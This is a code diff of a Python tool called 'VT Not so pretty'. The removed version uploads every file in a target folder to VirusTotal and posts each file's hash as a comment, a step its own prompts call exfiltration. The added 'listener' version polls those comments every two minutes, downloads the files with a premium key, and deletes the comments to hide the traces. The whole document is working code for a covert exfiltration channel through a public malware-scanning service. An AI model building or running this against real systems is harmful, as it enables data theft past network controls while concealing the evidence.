@@ -1,19 +1,18 @@
-import os
 import requests
-import hashlib
-import json
+import time
 import argparse
 import pyfiglet
+import os
 
-
-result = pyfiglet.figlet_format("VT Not so pretty by YanivG")
+result = pyfiglet.figlet_format("VT Not so pretty listener by YanivG")
 print(result)
 
 # Argument Parser for folder, API key, and file hash input
 parser = argparse.ArgumentParser(description="VT not so pretty by YanivG")
-parser.add_argument('-f', '--folder', type=str, help="Path to the folder you want to exfiltrate")
-parser.add_argument('-k', '--api_key', type=str, help="Your VirusTotal API key")
-parser.add_argument('-c', '--comments_file_hash', type=str, help="Hash to comment on in VirusTotal")
+parser.add_argument('-f', '--folder', type=str, help="Path to the folder you want to save files to")
+parser.add_argument('-k', '--api_key', type=str, help="Your Premium VirusTotal API key")
+parser.add_argument('-c', '--comments_file_hash', type=str, help="Hash to check comment on in VirusTotal")
+parser.add_argument('-d', '--delete_api_key', type=str, help="API key for deleting comments after download - this should be the one used for file upload", required=False)
 
 args = parser.parse_args()
 
@@ -21,113 +20,118 @@ args = parser.parse_args()
 def validate_folder_path(folder_path):
     return os.path.isdir(folder_path)
 
-# Get the folder path either from arguments or user input
-folder_path = args.folder if args.folder else input("Please enter the folder path you want to exfiltrate: ")
+# Prompt the user if folder from arguments isn't provided
+folder_path = args.folder if args.folder else input("Please enter the folder path you want to save files to: ")
 
 # Validate folder path
 while not validate_folder_path(folder_path):
     print("Invalid folder path. Please enter a valid folder path.")
-    folder_path = input("Please enter the folder path you want to exfiltrate: ")
-
-# VirusTotal API URL
-url = "https://www.virustotal.com/api/v3/files"
+    folder_path = input("Please enter the folder path you want to save files to: ")
 
 # Prompt the user if API key from arguments isn't provided
-api_key = args.api_key if args.api_key else input("Enter your VirusTotal API key: ")
+api_key = args.api_key if args.api_key else input("Please enter your Premium VirusTotal API key: ")
 
+# Prompt the user if Hash from user arguments isn't provided
+file_hash = args.comments_file_hash if args.comments_file_hash else input("Please enter the file hash to check comments on in VirusTotal: ")
+
+# Get delete API key from arguments
+delete_api_key = args.delete_api_key if args.delete_api_key else None
+
+url = f'https://www.virustotal.com/api/v3/files/{file_hash}/comments'
+
+# Headers for main API requests
 headers = {
-    "x-apikey": api_key
+    'x-apikey': api_key  
 }
 
-# Prompt the user if hash from arguments isn't provided
-comments_file_hash = args.comments_file_hash if args.comments_file_hash else input("Please enter the hash to comment on: ")
+# Headers for DELETE requests
+delete_headers = {
+    'x-apikey': delete_api_key
+} if delete_api_key else None
 
-# Function to check if the API key is valid by making a simple request
-def validate_api_key():
+# Function to download file based on hash from comments
+def download_file(file_hash):
     try:
-        # Send a request to the API with the provided key to check key
-        response = requests.get("https://www.virustotal.com/api/v3/users/me", headers=headers)
+        # URL for file download
+        download_url = f'https://www.virustotal.com/api/v3/files/{file_hash}/download'
+        
+        # Request to download file
+        response = requests.get(download_url, headers=headers, stream=True)
+        
+        # Check if request was successful
         if response.status_code == 200:
-            print("API key is valid.")
-            return True
+            file_name = os.path.join(folder_path, f"{file_hash}.vt")  # Save file using the hash as the file name and the extension .vt
+            with open(file_name, 'wb') as file:
+                for chunk in response.iter_content(1024):
+                    if chunk:
+                        file.write(chunk)
+            print(f"File {file_hash} downloaded successfully.")
         else:
-            print(f"Error: Invalid API key. Response: {response.status_code} - {response.text}")
-            return False
-    except requests.exceptions.RequestException as e:
-        print(f"Error occurred while validating the API key: {e}")
-        return False
-    
-# Function to check if the file hash is known to VirusTotal
-def is_hash_known_to_virustotal(file_hash):
-    try:
-        check_url = f"https://www.virustotal.com/api/v3/files/{file_hash}"
-        response = requests.get(check_url, headers=headers)
-        if response.status_code == 200:
-            return True
-        elif response.status_code == 404:
-            return False
-        else:
-            print(f"Error checking hash: {response.status_code} - {response.text}")
-            return False
-    except requests.exceptions.RequestException as e:
-        print(f"Error occurred while checking the file hash: {e}")
-        return False
+            print(f"Failed to download file {file_hash}: {response.status_code}")
+    except Exception as e:
+        print(f"Error downloading file {file_hash}: {e}")
 
-# Function to upload a file and post a comment if necessary
-def upload_and_comment_on_file(file_path, filename, comments_file_hash):
-    try:
-        with open(file_path, "rb") as file:
-            file_byte = file.read()  # Read the file content
-            hash_sha256 = hashlib.sha256()
-            hash_sha256.update(file_byte)
-            file_hash = hash_sha256.hexdigest()  # Compute the SHA-256 hash
-
-            # Upload the file to VirusTotal
-            files = {"file": (filename, file_byte)}
-            response = requests.post(url, files=files, headers=headers)
-            print(f"File: {filename}, SHA-256 Hash: {file_hash}")
-            print(f"VirusTotal Response: {response.status_code} - {response.text}")
-
-            # Check if the file hash is known in VirusTotal
+# Function to delete a comment based on ID
+def delete_comment(comment_id):
+    if delete_headers:
+        try:
+            # URL for deleting the comment
+            delete_url = f"https://www.virustotal.com/api/v3/comments/{comment_id}"
+            
+            # Request to delete the comment
+            response = requests.delete(delete_url, headers=delete_headers)
+            
             if response.status_code == 200:
-                while not is_hash_known_to_virustotal(comments_file_hash):
-                    print(f"Error: The hash {comments_file_hash} is not found in VirusTotal.")
-                    comments_file_hash = input("Please enter a valid hash to comment on: ")
-
-                # Post a comment to the file using the hash provided by the user
-                comment_url = f"https://www.virustotal.com/api/v3/files/{comments_file_hash}/comments"
-                comment_body = json.dumps({
-                    "data": {
-                        "type": "comment",
-                        "attributes": {
-                            "text": file_hash
-                        }
-                    }
-                })
-                comment_response = requests.post(comment_url, headers=headers, data=comment_body)
-                print(f"Comment Response: {comment_response.status_code} - {comment_response.text}")
+                print(f"Comment with ID {comment_id} deleted successfully.")
             else:
-                print(f"Error: Failed to upload file '{filename}' to VirusTotal.")
-    except FileNotFoundError as e:
-        print(f"File error: {e}")
-    except requests.exceptions.RequestException as e:
-        print(f"Error occurred while uploading file: {e}")
-    except Exception as e:
-        print(f"Unexpected error: {e}")
+                print(f"Failed to delete comment with ID {comment_id}: {response.status_code}")
+        except Exception as e:
+            print(f"Error deleting comment {comment_id}: {e}")
+    else:
+        print("No API key provided for comment deletion. Skipping comment deletion.")
 
-# Recursive function to upload files from the directory and its subdirectories
-def upload_files_recursively(directory_path):
+# Function to get and print the comments, and then download files based on hashes
+def get_comments():
     try:
-        for root, dirs, files in os.walk(directory_path):
-            for filename in files:
-                file_path = os.path.join(root, filename)
-                upload_and_comment_on_file(file_path, filename, comments_file_hash)
+        # Make the request to VirusTotal API to get comments on the file
+        response = requests.get(url, headers=headers)
+        
+        # Check if the request was successful
+        if response.status_code == 200:
+            data = response.json()
+            
+            # Extract comments from the 'data' array in the response
+            comments = data.get('data', [])
+            
+            if comments:
+                print("Comments:")
+                for comment in comments:
+                    # Extract and print the comment text
+                    comment_text = comment["attributes"].get('text', 'No comment available')
+                    print(f"Comment: {comment_text}")
+                    
+                    # Check if the comment contains a file hash
+                    # Assuming the hashes are alphanumeric strings of length 64
+                    possible_hash = comment_text.strip()
+                    if len(possible_hash) == 64:  # Check if it's a valid SHA256 hash length
+                        print(f"Found hash in comment: {possible_hash}")
+                        download_file(possible_hash)
+                        
+                        # Delete the comment after processing it (if delete_api_key is provided)
+                        if delete_headers:
+                            comment_id = comment["id"]
+                            delete_comment(comment_id)
+            else:
+                print("No comments available.")
+        else:
+            print(f"Failed to retrieve data: {response.status_code}")
     except Exception as e:
-        print(f"Error occurred while traversing the directory: {e}")
+        print(f"Error: {e}")
 
-# Validate the API key first before proceeding
-if validate_api_key():
-    # Start uploading files recursively from the specified folder
-    upload_files_recursively(folder_path)
-else:
-    print("Exiting the script due to invalid API key.")
+# Loop to call the function every 2 minutes
+while True:
+    get_comments()
+    # Waiting for 2 minutes (120 seconds) before the next request
+    
+    print("Waiting for new comments for 2 minutes")
+    time.sleep(120)
